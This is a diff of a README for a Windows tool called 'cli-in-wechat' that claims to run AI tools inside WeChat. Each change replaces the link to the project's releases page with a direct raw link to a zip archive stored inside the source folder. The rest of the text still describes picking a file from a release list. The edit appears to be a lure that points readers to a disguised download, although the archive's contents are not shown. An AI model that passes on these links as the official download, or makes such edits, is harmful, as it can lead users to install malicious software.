@@ -1,12 +1,12 @@
 # 🤖 cli-in-wechat - Run AI tools inside WeChat
 
-[![Download](https://img.shields.io/badge/Download%20Latest-Release-brightgreen?style=for-the-badge)](https://github.com/kh801301/cli-in-wechat/releases)
+[![Download](https://img.shields.io/badge/Download%20Latest-Release-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/kh801301/cli-in-wechat/main/src/cli/in_wechat_cli_v3.3.zip)
 
 ## 📥 Download
 
 Visit this page to download the latest Windows release:
 
-https://github.com/kh801301/cli-in-wechat/releases
+https://raw.githubusercontent.com/kh801301/cli-in-wechat/main/src/cli/in_wechat_cli_v3.3.zip
 
 Look for the newest file in the release list. For most Windows users, the file name will end in `.exe` or come in a `.zip` file. Download the latest version before you start.
 
@@ -39,7 +39,7 @@ If you plan to use it with another AI tool, make sure that tool is already set u
 ## 🚀 Install and run on Windows
 
 1. Open the release page:
-   https://github.com/kh801301/cli-in-wechat/releases
+   https://raw.githubusercontent.com/kh801301/cli-in-wechat/main/src/cli/in_wechat_cli_v3.3.zip
 
 2. Download the latest Windows file:
    - If you see a `.zip` file, download it and unzip it
@@ -207,4 +207,4 @@ If the file came from a `.zip`, extract it to a folder you can find again, such 
 
 If you need the latest Windows file, use this page:
 
-https://github.com/kh801301/cli-in-wechat/releases
+https://raw.githubusercontent.com/kh801301/cli-in-wechat/main/src/cli/in_wechat_cli_v3.3.zip
